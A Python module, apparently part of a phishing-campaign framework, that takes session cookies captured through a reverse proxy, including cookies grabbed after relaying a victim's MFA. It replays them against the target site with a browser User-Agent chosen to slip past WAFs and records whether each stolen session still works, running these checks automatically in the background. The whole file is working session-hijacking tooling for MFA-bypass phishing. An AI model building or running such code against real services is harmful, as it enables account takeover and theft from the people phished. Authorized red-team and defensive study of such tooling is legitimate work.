"""Cookie replay validation for captured proxy cookies."""

import logging
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime, timedelta
from typing import Iterable
from urllib.parse import urlparse

import requests

from dropoutjeep_lib import db
from dropoutjeep_lib.models import Campaign, CapturedCookie

logger = logging.getLogger(__name__)

# Common URL path fragments that indicate a redirect to a login flow.
_KNOWN_LOGIN_PATH_FRAGMENTS = (
    "/login",
    "/signin",
    "/logon",
    "/auth",
    "/authenticate",
    "/sso",
    "/oauth",
    "/identity",
)

# Realistic browser UA so WAFs do not block the replay probe.
_REPLAY_USER_AGENT = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
)

# Background executor so validation never blocks the proxy response path.
_validation_pool = ThreadPoolExecutor(max_workers=2, thread_name_prefix="cookie-val-")


def _is_login_redirect(location: str | None) -> bool:
    """Return True if a redirect Location points to a known login path."""
    if not location:
        return False
    parsed = urlparse(location)
    path = (parsed.path or "").lower()
    return any(fragment in path for fragment in _KNOWN_LOGIN_PATH_FRAGMENTS)


def _build_cookie_header(cookies: Iterable[CapturedCookie]) -> str:
    """Build a single Cookie header from multiple captured cookies."""
    parts = []
    seen = set()
    for c in cookies:
        if c.cookie_name in seen:
            continue
        seen.add(c.cookie_name)
        parts.append(f"{c.cookie_name}={c.cookie_value}")
    return "; ".join(parts)


def _run_replay(campaign: Campaign, cookies: list[CapturedCookie]) -> dict:
    """Execute the replay request and return the outcome.

    The caller is responsible for committing any state changes to ``cookies``.
    """
    target_url = campaign.get_proxy_target_url()
    if not target_url:
        return {
            "valid": False,
            "error": "Campaign has no proxy target URL configured",
            "status_code": None,
            "redirect_location": None,
        }

    headers = {
        "Cookie": _build_cookie_header(cookies),
        "User-Agent": _REPLAY_USER_AGENT,
    }

    try:
        resp = requests.get(
            target_url,
            headers=headers,
            timeout=15,
            allow_redirects=False,
        )
    except requests.RequestException as exc:
        logger.exception("Cookie replay request failed for campaign %s", campaign.id)
        return {
            "valid": False,
            "error": f"Request failed: {exc}",
            "status_code": None,
            "redirect_location": None,
        }

    redirect_location = resp.headers.get("Location")
    is_login_redirect = _is_login_redirect(redirect_location)

    if 200 <= resp.status_code < 300 and not is_login_redirect:
        valid = True
        error = None
    elif 300 <= resp.status_code < 400 and is_login_redirect:
        valid = False
        error = f"Redirect to login path: {redirect_location}"
    elif 300 <= resp.status_code < 400:
        valid = False
        error = f"Unexpected redirect ({resp.status_code}) to {redirect_location}"
    else:
        valid = False
        error = f"HTTP {resp.status_code}"

    return {
        "valid": valid,
        "error": error,
        "status_code": resp.status_code,
        "redirect_location": redirect_location,
    }


def _mark_cookies(cookies: list[CapturedCookie], outcome: dict) -> None:
    """Apply a replay outcome to a list of cookies and commit."""
    now = datetime.utcnow()
    for c in cookies:
        c.is_valid = outcome["valid"]
        c.validated_at = now
        c.validation_error = outcome["error"]
    db.session.commit()


def _get_recent_post_mfa_cookies(campaign_id: int, recipient_token: str | None):
    """Return post-MFA cookies captured in the last few minutes for a recipient."""
    cutoff = datetime.utcnow() - timedelta(minutes=5)
    token = recipient_token or ""
    return (
        CapturedCookie.query.filter_by(
            campaign_id=campaign_id,
            recipient_token=token,
            source="post_mfa",
        )
        .filter(CapturedCookie.captured_at >= cutoff)
        .order_by(CapturedCookie.captured_at.desc())
        .all()
    )


def validate_recipient_session(campaign_id: int, recipient_token: str | None) -> dict:
    """Replay the most recent post-MFA cookie set for a recipient.

    Returns a dict with keys:
        - valid (bool | None): validation outcome.
        - error (str | None): error message on failure.
        - status_code (int | None): HTTP status code from replay.
        - redirect_location (str | None): Location header on redirect.
        - cookie_count (int): number of cookies validated together.
    """
    cookies = _get_recent_post_mfa_cookies(campaign_id, recipient_token)
    if not cookies:
        return {
            "valid": None,
            "error": "No recent post-MFA cookies to validate",
            "status_code": None,
            "redirect_location": None,
            "cookie_count": 0,
        }

    campaign = Campaign.query.get(campaign_id)
    outcome = _run_replay(campaign, cookies)
    _mark_cookies(cookies, outcome)
    outcome["cookie_count"] = len(cookies)
    return outcome


def validate_captured_cookie(captured_cookie_id: int) -> dict:
    """Validate a single captured cookie.

    If the cookie was captured after a successful MFA relay, the whole recent
    post-MFA session is validated together because sessions usually need
    multiple cookies. Otherwise the single cookie is replayed on its own.
    """
    cookie = CapturedCookie.query.get(captured_cookie_id)
    if not cookie:
        return {
            "valid": False,
            "error": "Captured cookie not found",
            "status_code": None,
            "redirect_location": None,
            "cookie_count": 0,
        }

    campaign = cookie.campaign

    if cookie.source == "post_mfa":
        outcome = validate_recipient_session(cookie.campaign_id, cookie.recipient_token)
        return outcome

    # Single-cookie replay for manually captured or non-MFA cookies.
    outcome = _run_replay(campaign, [cookie])
    _mark_cookies([cookie], outcome)
    outcome["cookie_count"] = 1
    return outcome


def schedule_validate_recipient_session(campaign_id: int, recipient_token: str | None) -> None:
    """Queue automatic validation of a recipient's post-MFA session."""
    _validation_pool.submit(_run_scheduled_validation, campaign_id, recipient_token)


def _run_scheduled_validation(campaign_id: int, recipient_token: str | None) -> None:
    try:
        validate_recipient_session(campaign_id, recipient_token)
    except Exception:
        logger.exception(
            "Automatic cookie validation failed for campaign %s recipient %s",
            campaign_id,
            recipient_token,
        )
